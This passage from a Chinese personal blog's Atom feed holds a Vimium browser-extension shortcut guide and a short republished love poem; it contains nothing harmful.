    <content type="html"><![CDATA[<p>========================</p><h3 id="vimium-介绍"><a href="#vimium-介绍" class="headerlink" title="vimium 介绍"></a>vimium 介绍</h3><p>Vimium  是一款可以只用键盘就控制浏览器的「神器」，如果你喜欢鼠标手势所带来的效率提升,一定要试试这个插件。</p><p>下载地址：<br><a href="https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb" target="_blank" rel="noopener">Chrome</a><br><a href="https://addons.mozilla.org/zh-CN/firefox/addon/vimium-ff/?src=userprofile" target="_blank" rel="noopener">Firefox</a></p><h3 id="Vimium使用总结"><a href="#Vimium使用总结" class="headerlink" title="Vimium使用总结"></a>Vimium使用总结</h3><a id="more"></a><p><img src="/img/vimium.png" alt="vim"></p><ul><li><p>页内浏览</p><ul><li>j:向下滚动一点</li><li>k:向上滚动一点</li><li>gg:到页面最底部</li><li>G:到页面最底部</li><li>d:向下翻一屏</li><li>u:向上翻一屏</li><li>gs:查看源代码</li><li>gi:聚焦到第一个输入点</li><li>i/Esc: 输入模式/命令模式</li></ul></li><li><p>快速选取</p><ul><li>/:快速查找 [n] 向下匹配项  [N]向上匹配</li><li>yy:拷贝当前页面的URL</li><li>yf:拷贝指定URL</li><li>V:选取指定段内容</li></ul></li><li><p>标签操作</p><ul><li>t:创建一个新标签</li><li>T:显示所有标签</li><li>J:上一个标签</li><li>K:下一个标签</li><li>x:关闭当前标签</li><li>X:恢复上个关闭的标签</li><li>r:重新加载  [F5]</li></ul></li><li><p>导航操作</p><ul><li>p/P : 打开剪贴板内的链接,否则进行搜索</li><li>o/O:从收藏夹、历史记录打开网址：如果你输的是一个网址，可以直接回车。</li><li>f/F: 快速打开某链接</li><li>gf：跳到父页面</li><li>H:回退上一个历史页面 [&lt;-]</li><li>L:回到下一个历史页面  [-&gt;]</li></ul></li><li><p>浏览器快捷键</p><ul><li>ctrl+w: 关闭当前页面</li><li>ctrl+t: 新建标签</li><li>F6: 在当前页面输入URL</li><li>ctrl+d: 为当前页添加书签</li></ul></li></ul><hr><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>某些网站可能自带键盘映射，可为其单独设置 unmapAll 以恢复网页自带的快捷键。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;========================&lt;/p&gt;
&lt;h3 id=&quot;vimium-介绍&quot;&gt;&lt;a href=&quot;#vimium-介绍&quot; class=&quot;headerlink&quot; title=&quot;vimium 介绍&quot;&gt;&lt;/a&gt;vimium 介绍&lt;/h3&gt;&lt;p&gt;Vimium  是一款可以只用键盘就控制浏览器的「神器」，如果你喜欢鼠标手势所带来的效率提升,一定要试试这个插件。&lt;/p&gt;
&lt;p&gt;下载地址：&lt;br&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/vimium/dbepggeogbaibhgnhhndojpepiihcmeb&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Chrome&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://addons.mozilla.org/zh-CN/firefox/addon/vimium-ff/?src=userprofile&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Firefox&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Vimium使用总结&quot;&gt;&lt;a href=&quot;#Vimium使用总结&quot; class=&quot;headerlink&quot; title=&quot;Vimium使用总结&quot;&gt;&lt;/a&gt;Vimium使用总结&lt;/h3&gt;
    
    </summary>
    
    
      <category term="Tools" scheme="https://xiaotaoist.github.io/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>随笔・一</title>
    <link href="https://xiaotaoist.github.io/2018/02/16/poetry/"/>
    <id>https://xiaotaoist.github.io/2018/02/16/poetry/</id>
    <published>2018-02-15T17:09:01.000Z</published>
    <updated>2018-03-31T14:35:28.428Z</updated>
    
    <content type="html"><![CDATA[<p>===========================<br><a id="more"></a><br><img src="/img/love.png" alt="love"></p><blockquote><p>喜欢是种奇妙的感觉，它不需要特意营造的氛围，不需要晴朗的天气，只要是你，只需要是你。</p></blockquote><p><strong>初心</strong><br>捡起一段坚韧的丝线，<br>串起断线的曾经。<br>抓住夏的尾巴，<br>将时钟拨到最初。<br>夏花灿烂那时，<br>是我们的开始。<br>贪念着空气里的丝丝香甜， </p><p>就这样静静地，<br>静静地望着你。<br>截一段甜到发稠的岁月，<br>缓缓流淌在时光里。<br>折一只小船，<br>轻轻飘荡到你的心房。<br>小船轻触你内心的柔软，<br>扒开你坚硬的外壳。  </p><p>原来你是最初的心动，<br>是夏日最绵软的清风。<br>我想如果我爱你，<br>可是我发现不是如果，<br>我一直都在爱你。 </p><p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;—— 李十四 </p><hr><font size="2" color="gray"><em>非原创，经原作者授权而发布于此。</em></font>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;===========================&lt;br&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="https://xiaotaoist.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
